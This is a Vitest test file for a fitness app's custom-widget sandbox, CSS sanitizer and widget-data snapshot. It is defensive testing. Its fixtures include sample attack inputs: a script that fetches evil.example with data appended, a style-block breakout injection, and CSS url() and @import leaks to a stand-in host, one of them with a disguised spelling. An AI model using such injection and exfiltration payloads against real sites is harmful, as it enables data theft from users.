import { describe, expect, it } from "vitest";
import { defaultConfig as cfg } from "@/config/app.config";
import { LAYOUT_PRESETS, WIDGET_INFO } from "@/config/layouts";
import { sanitizeCss } from "./css";
import { buildWidgetData } from "./data";
import { buildSrcDoc, readWidgetMessage, WIDGET_CSP } from "./sandbox";

describe("custom widget sandbox", () => {
  it("puts the no-network CSP before any user code", () => {
    const doc = buildSrcDoc("<script>fetch('https://evil.example?x='+1)</script>", { accent: "#ff7a45" });
    const csp = doc.indexOf(WIDGET_CSP);
    expect(csp).toBeGreaterThan(0);
    expect(csp).toBeLessThan(doc.indexOf("fetch("));
    expect(WIDGET_CSP).toContain("default-src 'none'"); // no fetch, XHR, websockets, external images or fonts
    expect(WIDGET_CSP).toContain("form-action 'none'");
    expect(doc).toContain("--accent:#ff7a45;");
  });
  it("drops theme values that could break out of the style block", () => {
    expect(buildSrcDoc("", { evil: "red;}</style><script>x()</script>", ok: "#fff" })).not.toContain("x()");
  });
  it("only accepts resize and opening known app pages", () => {
    expect(readWidgetMessage({ type: "gg:resize", height: 5000 })).toEqual({ type: "resize", height: 600 });
    expect(readWidgetMessage({ type: "gg:open", path: "/progress" })).toEqual({ type: "open", path: "/progress" });
    for (const bad of [{ type: "gg:open", path: "https://evil.example" }, { type: "gg:open", path: "/api/discord" }, { type: "gg:logout" }, null, "x"]) expect(readWidgetMessage(bad)).toBeNull();
  });
});

describe("custom CSS", () => {
  it("removes anything that could load from the internet, including disguised spellings", () => {
    const out = sanitizeCss(`@import url(https://evil.example/a.css);
      .a { background: url("https://evil.example/x?leak") }
      .b { background: u\\72 l(https://evil.example/y) }
      .c { background-image: image-set("https://evil.example/z" 1x) }
      .d { background: url(data:image/png;base64,AAAA) }
      </style><script>alert(1)</script>`);
    expect(out).not.toMatch(/https?:\/\//);
    expect(out).toContain("url(data:image/png;base64,AAAA)"); // inline images are fine
    expect(out).not.toContain("</style");
  });
});

describe("widget data and layouts", () => {
  it("builds a read-only snapshot in the user's unit with no ids", () => {
    const now = new Date("2026-10-21T12:00:00Z");
    const d = buildWidgetData({
      cfg, unit: "lb", now, today: null, bodyweight: [{ date: "2026-10-20", weightKg: 80 }], dayNames: new Map([["d1", "Push"]]),
      exercises: new Map([["bp", { id: "bp", name: "Bench Press", category: "upper", equipment: "barbell", incrementKg: null, ownerId: null }]]),
      sessions: [{ id: "s1", splitDayId: "d1", startedAt: "2026-10-20T18:00:00Z", finishedAt: "2026-10-20T19:00:00Z", source: "web" }],
      sets: [{ id: "x", sessionId: "s1", exerciseId: "bp", setIndex: 0, weightKg: 100, reps: 5, rpe: null, isWarmup: false, note: null, createdAt: "2026-10-20T18:10:00Z" }],
    });
    expect(d.recent[0]).toEqual({ date: "2026-10-20", dayName: "Push", lifts: [{ name: "Bench Press", sets: [{ weight: 220.5, reps: 5 }] }] });
    expect(d.lifts[0].name).toBe("Bench Press");
    expect(d.bodyweight[0]).toEqual({ date: "2026-10-20", weight: 176.4 });
    expect(JSON.stringify(d)).not.toMatch(/"(id|sessionId|exerciseId|ownerId)"/);
  });
  it("layouts only use widgets that exist", () => {
    for (const p of LAYOUT_PRESETS) for (const w of p.widgets) expect(WIDGET_INFO[w.id]).toBeDefined();
    for (const w of cfg.dashboard.widgets) expect(WIDGET_INFO[w.id]).toBeDefined();
  });
});
